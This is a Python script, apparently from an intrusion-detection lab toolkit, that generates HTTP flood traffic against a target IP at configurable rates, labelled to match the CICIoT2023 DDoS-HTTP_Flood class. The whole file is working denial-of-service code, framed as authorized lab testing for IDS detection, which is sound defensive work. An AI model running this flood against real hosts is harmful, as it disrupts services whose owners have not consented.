"""
DDoS HTTP Flood — authorized lab testing only.
Generates rapid HTTP requests to target for IDS detection testing.
Maps to CICIoT2023 class: DDoS-HTTP_Flood
"""
import socket
import threading
import time
import random


def _send_http_request(target_ip: str, port: int = 80, path: str = '/'):
    """Send a single HTTP GET request."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(2)
        sock.connect((target_ip, port))
        request = (
            f"GET {path} HTTP/1.1\r\n"
            f"Host: {target_ip}\r\n"
            f"User-Agent: Mozilla/5.0 (IoT-Device)\r\n"
            f"Accept: */*\r\n"
            f"Connection: close\r\n\r\n"
        )
        sock.sendall(request.encode())
        sock.recv(4096)
        sock.close()
        return True
    except Exception:
        return False


def run(target_ip: str, duration: int = 30, intensity: str = 'medium',
        target_port: int = 80):
    """
    Generate HTTP flood traffic.

    Args:
        target_ip: victim IP (must be within lab VPC)
        duration: seconds to run
        intensity: low/medium/high
    """
    rates = {'low': 20, 'medium': 100, 'high': 500}
    rps = rates.get(intensity, 100)
    delay = 1.0 / rps

    paths = ['/', '/status', '/config', '/api/data', '/login',
             '/admin', '/dashboard', '/sensor/1', '/sensor/2']

    print(f"[HTTP Flood] Target: {target_ip}:{target_port}")
    print(f"[HTTP Flood] Duration: {duration}s, Rate: ~{rps} rps")

    sent = 0
    success = 0
    start = time.time()
    while time.time() - start < duration:
        path = random.choice(paths)
        if _send_http_request(target_ip, target_port, path):
            success += 1
        sent += 1
        if sent % 50 == 0:
            elapsed = time.time() - start
            print(f"  [{elapsed:.0f}s] Sent {sent} requests ({success} successful)")
        time.sleep(delay)

    elapsed = time.time() - start
    print(f"[HTTP Flood] Complete: {sent} requests ({success} ok) in {elapsed:.1f}s")
    return sent
